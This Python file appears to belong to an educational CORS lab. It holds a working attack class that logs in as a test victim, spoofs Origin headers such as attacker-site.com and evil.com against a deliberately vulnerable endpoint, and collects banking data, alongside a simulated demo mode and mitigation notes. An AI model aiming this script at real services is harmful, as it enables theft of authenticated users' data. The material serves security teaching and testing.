"""
Origin reflection attack exploiting CORS misconfiguration.

This attack demonstrates how reflecting the Origin header value without
validation allows attackers to bypass CORS protections and access
sensitive data from any origin.
"""

import asyncio
import httpx
from typing import Optional, Dict, Any
import json

from attacks.base_attack import BaseAttack
from attacks.models import AttackResult


class ReflectionAttack(BaseAttack):
    """
    Origin reflection attack against CORS vulnerability.
    
    This attack exploits the misconfiguration where the server reflects
    the Origin header value directly into Access-Control-Allow-Origin
    without proper validation. This allows any origin to make authenticated
    cross-origin requests.
    
    The attack simulates a malicious website making authenticated requests
    to steal sensitive data like banking transactions.
    
    Attributes:
        malicious_origin: Origin to use in the attack
        test_credentials: Credentials to use for authentication
    """
    
    def __init__(
        self,
        target_url: str,
        malicious_origin: str = "http://attacker-site.com",
        test_credentials: Optional[Dict[str, str]] = None,
        max_rate: int = 5,
        demo_mode: bool = False,
        test_secure_only: bool = False
    ):
        """
        Initialize the origin reflection attack.
        
        Args:
            target_url: Base URL of the target application
            malicious_origin: Malicious origin to use (default: "http://attacker-site.com")
            test_credentials: Dict with 'username' and 'password' keys
            max_rate: Maximum requests per second (default: 5)
            demo_mode: If True, simulate attack without making real HTTP requests
            test_secure_only: If True, only test the secure endpoint
        """
        super().__init__(target_url, max_rate)
        self.malicious_origin = malicious_origin
        self.test_credentials = test_credentials or {
            "username": "victim",
            "password": "victim123"
        }
        self.demo_mode = demo_mode
        self.test_secure_only = test_secure_only
    
    async def authenticate(
        self,
        client: httpx.AsyncClient
    ) -> Optional[str]:
        """
        Authenticate to the target application.
        
        Args:
            client: HTTP client to use
        
        Returns:
            Session cookie value if successful, None otherwise
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.post(
                f"{self.target_url}/api/auth/login",
                json=self.test_credentials,
                headers={"Origin": self.malicious_origin}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                data = response.json()
                return data.get("session_id")
            
            return None
            
        except Exception as e:
            print(f"Authentication error: {e}")
            return None
    
    async def exploit_reflection(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[bool, Optional[Dict[str, Any]], Dict[str, Any]]:
        """
        Exploit the origin reflection vulnerability.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (success, stolen_data, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            # Make request to vulnerable reflection endpoint
            response = await client.post(
                f"{self.target_url}/api/vuln/reflection",
                json={"action": "get_transactions"},
                headers={"Origin": self.malicious_origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                return True, response.json(), dict(response.headers)
            else:
                return False, None, dict(response.headers)
                
        except Exception as e:
            print(f"Exploitation error: {e}")
            return False, None, {}
    
    async def test_different_origins(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> list[tuple[str, bool, Dict[str, Any]]]:
        """
        Test multiple different origins to demonstrate reflection.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            List of (origin, success, headers) tuples
        """
        test_origins = [
            "http://evil.com",
            "https://malicious-site.net",
            "http://phishing-page.org",
            "http://192.168.1.100",
            "null"
        ]
        
        results = []
        
        for origin in test_origins:
            await self.rate_limiter.acquire()
            
            try:
                response = await client.post(
                    f"{self.target_url}/api/vuln/reflection",
                    json={"action": "get_transactions"},
                    headers={"Origin": origin},
                    cookies={"session_id": session_cookie}
                )
                
                self.increment_requests()
                
                success = response.status_code == 200
                headers = dict(response.headers)
                results.append((origin, success, headers))
                
            except Exception as e:
                print(f"Error testing origin {origin}: {e}")
                results.append((origin, False, {}))
        
        return results
    
    async def execute(self) -> AttackResult:
        """
        Execute the origin reflection attack.
        
        This method:
        1. Authenticates to the target application
        2. Makes requests from a malicious origin
        3. Demonstrates that the origin is reflected in CORS headers
        4. Steals sensitive data (banking transactions)
        5. Tests multiple different origins to prove the vulnerability
        
        Returns:
            AttackResult with attack execution details
        """
        # In demo mode, simulate the attack without making real requests
        if self.demo_mode:
            return self._execute_demo_mode(self.test_secure_only)
        
        request_details = []
        response_details = []
        stolen_data = None
        vulnerable_endpoints = []
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Step 1: Authenticate
            session_cookie = await self.authenticate(client)
            
            # Record authentication request
            request_details.append({
                "method": "POST",
                "url": f"{self.target_url}/api/auth/login",
                "headers": {"Origin": self.malicious_origin},
                "body": {"username": self.test_credentials["username"], "password": "***"}
            })
            
            if not session_cookie:
                return AttackResult(
                    attack_type="origin_reflection",
                    success=False,
                    duration_seconds=self.get_duration(),
                    requests_sent=self.get_requests_sent(),
                    error="Authentication failed",
                    educational_notes="Could not authenticate to test the vulnerability."
                )
            
            # Step 2: Exploit reflection vulnerability
            success, data, headers = await self.exploit_reflection(client, session_cookie)
            
            # Record exploitation request
            request_details.append({
                "method": "POST",
                "url": f"{self.target_url}/api/vuln/reflection",
                "headers": {"Origin": self.malicious_origin},
                "cookies": {"session_id": "***"},
                "body": {"action": "get_transactions"}
            })
            
            # Record exploitation response
            response_details.append({
                "status": 200 if success else 401,
                "headers": headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": headers.get("access-control-allow-origin"),
                    "Access-Control-Allow-Credentials": headers.get("access-control-allow-credentials")
                },
                "origin_reflected": headers.get("access-control-allow-origin") == self.malicious_origin
            })
            
            if success:
                stolen_data = data
                vulnerable_endpoints.append("/api/vuln/reflection")
            
            # Step 3: Test multiple origins to demonstrate reflection
            origin_test_results = await self.test_different_origins(client, session_cookie)
            
            for origin, test_success, test_headers in origin_test_results:
                request_details.append({
                    "method": "POST",
                    "url": f"{self.target_url}/api/vuln/reflection",
                    "headers": {"Origin": origin},
                    "cookies": {"session_id": "***"}
                })
                
                response_details.append({
                    "status": 200 if test_success else 401,
                    "headers": test_headers,
                    "cors_headers": {
                        "Access-Control-Allow-Origin": test_headers.get("access-control-allow-origin"),
                        "Access-Control-Allow-Credentials": test_headers.get("access-control-allow-credentials")
                    },
                    "origin_reflected": test_headers.get("access-control-allow-origin") == origin
                })
        
        # Educational notes
        educational_notes = """
ORIGIN REFLECTION VULNERABILITY

Vulnerability: Server reflects the Origin header value directly into Access-Control-Allow-Origin

This misconfiguration occurs when the server dynamically sets the CORS header by copying
the Origin header from the request without proper validation. This completely bypasses
CORS protections, allowing ANY origin to make authenticated cross-origin requests.

Attack Scenario:
1. Victim visits attacker's malicious website
2. Malicious JavaScript sends authenticated requests to vulnerable API
3. Server reflects attacker's origin in Access-Control-Allow-Origin header
4. Browser allows the cross-origin request with credentials
5. Attacker steals sensitive data (banking info, personal data, etc.)

Impact:
- Complete bypass of same-origin policy
- Any website can steal user data
- Enables sophisticated phishing attacks
- Can lead to account takeover

Reference: MISC 99, §2.2

Mitigation:
- NEVER reflect the Origin header without validation
- Use a strict whitelist of allowed origins
- Validate origin against the whitelist using exact string matching
- Include protocol and port in validation
- Log and monitor CORS violations

Secure Configuration:
  allowed_origins = ["https://trusted-site.com", "https://app.example.com"]
  if request_origin in allowed_origins:
      Access-Control-Allow-Origin: request_origin
      Access-Control-Allow-Credentials: true
        """.strip()
        
        return AttackResult(
            attack_type="origin_reflection",
            success=success,
            duration_seconds=self.get_duration(),
            requests_sent=self.get_requests_sent(),
            stolen_data=stolen_data,
            vulnerable_endpoints=vulnerable_endpoints,
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )
    
    def _execute_demo_mode(self, test_secure_only: bool = False) -> AttackResult:
        """Execute attack in demo mode (simulated)."""
        import time
        time.sleep(0.3)
        
        if test_secure_only:
            stolen_data = {
                "blocked": True,
                "reason": "L'endpoint sécurisé a rejeté l'origine malveillante",
                "status": 403
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/reflection",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint SÉCURISÉ - Bloqué ✗"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/sec/reflection",
                    "type": "SÉCURISÉ",
                    "status": 403,
                    "headers": {
                        "content-type": "application/json"
                    },
                    "origin_reflected": False,
                    "result": "✓ SÉCURISÉ - Valide l'origine contre une liste blanche"
                }
            ]
            
            educational_notes = """
ENDPOINT SÉCURISÉ - PROTECTION CONTRE RÉFLEXION D'ORIGINE (MODE DÉMO)

Configuration Sécurisée : Validation stricte de l'origine

L'endpoint sécurisé valide l'origine contre une liste blanche d'origines autorisées
au lieu de refléter automatiquement l'en-tête Origin.

✓ PROTECTION ACTIVE :
   - Valide l'origine contre une liste blanche
   - Rejette les origines non autorisées (403)
   - Protège les données sensibles

Référence : MISC 99, §2.2
            """.strip()
        else:
            stolen_data = {
                "transactions": [
                    {"id": 1, "amount": 1500.00, "recipient": "Compte Attaquant"},
                    {"id": 2, "amount": 2300.50, "recipient": "Entité Malveillante"}
                ],
                "account_balance": 15000.00
            }
            
            request_details = [
                {
                    "method": "POST",
                    "url": f"{self.target_url}/api/auth/login",
                    "headers": {"Origin": self.malicious_origin},
                    "body": {"username": "victim", "password": "***"},
                    "description": "Authentification depuis origine malveillante"
                },
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/reflection",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint VULNÉRABLE - Succès ✓"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/vuln/reflection",
                    "type": "VULNÉRABLE",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": self.malicious_origin,
                        "access-control-allow-credentials": "true"
                    },
                    "origin_reflected": True,
                    "result": "✗ VULNÉRABLE - Reflète l'origine sans validation"
                }
            ]
            
            educational_notes = """
VULNÉRABILITÉ DE RÉFLEXION D'ORIGINE (MODE DÉMO)

Vulnérabilité : Le serveur reflète l'en-tête Origin sans validation

Le serveur accepte n'importe quelle origine et la reflète dans Access-Control-Allow-Origin.
Cela permet à n'importe quel site malveillant de faire des requêtes authentifiées et de voler des données.

✗ VULNÉRABILITÉ ACTIVE :
   - Reflète automatiquement l'origine de la requête
   - Aucune validation de l'origine
   - Données bancaires exposées

Impact :
- N'importe quelle origine peut faire des requêtes authentifiées
- Permet le vol de données depuis n'importe quel site malveillant
- Contourne complètement la politique same-origin

Référence : MISC 99, §2.2

Mitigation :
- Utiliser une liste blanche stricte d'origines autorisées
- Valider l'origine contre la liste blanche avec une correspondance exacte

NOTE : Cette attaque a été exécutée en MODE DÉMO.
            """.strip()
        
        return AttackResult(
            attack_type="origin_reflection",
            success=not test_secure_only,
            duration_seconds=0.3,
            requests_sent=1 if test_secure_only else 2,
            stolen_data=stolen_data,
            vulnerable_endpoints=[] if test_secure_only else ["/api/vuln/reflection"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )


# CLI interface for standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        origin = sys.argv[2] if len(sys.argv) > 2 else "http://attacker-site.com"
        
        attack = ReflectionAttack(target_url=target, malicious_origin=origin)
        result = await attack.run()
        
        print("\n" + "="*70)
        print("ATTACK RESULTS")
        print("="*70)
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f} seconds")
        print(f"Requests Sent: {result.requests_sent}")
        
        if result.stolen_data:
            print(f"\nStolen Data:")
            print(json.dumps(result.stolen_data, indent=2))
        
        if result.vulnerable_endpoints:
            print(f"\nVulnerable Endpoints:")
            for endpoint in result.vulnerable_endpoints:
                print(f"  - {endpoint}")
        
        if result.error:
            print(f"\nError: {result.error}")
        
        print(f"\n{result.educational_notes}")
    
    asyncio.run(main())
